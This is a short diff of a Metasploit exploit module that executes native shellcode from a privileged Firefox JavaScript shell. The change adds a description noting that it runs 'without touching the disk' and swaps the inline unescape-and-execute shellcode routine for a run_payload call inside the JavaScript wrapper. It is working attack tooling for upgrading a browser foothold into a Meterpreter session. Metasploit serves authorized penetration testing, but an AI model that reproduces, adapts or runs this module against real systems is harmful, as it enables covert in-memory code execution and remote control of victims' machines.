+++ modules/exploits/firefox/local/exec_shellcode.rb
@@ -14,9 +14,10 @@ class Metasploit3 < Msf::Exploit::Local
     super(update_info(info,
       'Name'          => 'Firefox Exec Shellcode from Privileged Javascript Shell',
       'Description'   => %q{
+        Allows execution of native payloads from a privileged Firefox Javascript shell.
         Puts the specified payload into memory, adds the necessary protection flags,
         and calls it. Useful for upgrading a Firefox javascript shell to a Meterpreter
-        session.
+        session without touching the disk.
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'joev' ],
@@ -44,13 +45,10 @@ class Metasploit3 < Msf::Exploit::Local
   end
 
   def js_payload
-    js_string = Rex::Text.to_unescape(payload.encoded)
     %Q|
       (function(send){
         try {
-          #{exec_shellcode_source}
-          var sc  = "#{js_string}";
-          execShellcode(unescape(sc));
+          #{run_payload}
           send("Payload executed.");
         } catch (e) {
           send(e);
